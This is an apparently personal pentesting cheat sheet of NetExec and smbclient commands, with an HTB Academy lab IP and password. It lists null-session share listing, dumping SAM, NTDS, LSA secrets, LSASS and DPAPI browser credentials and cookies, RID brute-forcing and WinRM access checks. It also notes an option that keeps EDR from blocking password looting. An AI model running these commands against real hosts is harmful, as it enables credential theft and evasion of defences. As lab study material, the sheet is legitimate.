nxc anonymous login/null session
netexec anonymous login

```
smbclient -L ip -U 'anon'
nxc smb ip -u 'vipa0z' -p ''  shares
```

dump sam (requires --local-auth and local admin privs)
`--sam --local-auth`
`--ntds`
`--loggedon-users`
`--rid-brute`

1. dumping cached lsass passwords
   `-M lsassy`
2. Dumping LSA secrets (registery hives)
   `--lsa`

3. dumping DPAPI
   You can dump DPAPI credentials using NetExec using the following option: `--dpapi`. It will get all secrets from Credential Manager, Chrome, Edge, Firefox. `--dpapi` supports the following options :

- cookies : Collect every cookies in browsers
- nosystem : Won't collect system credentials. This will prevent EDR from stopping you from looting passwords 🔥

```
nxc smb <ip> -u user -p password --dpapi
nxc smb <ip> -u user -p password --dpapi cookies
nxc smb <ip> -u user -p password --dpapi nosystem
nxc smb <ip> -u user -p password --local-auth --dpapi nosystem
```

local authentication

```shell-session
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

3. enumerate dc trusts

```
nxc ldap <ip> -u user -p pass --dc-list
```

4. confirm winrm access to a host

```
nxc winrm ip -u user -p 'pas'
```
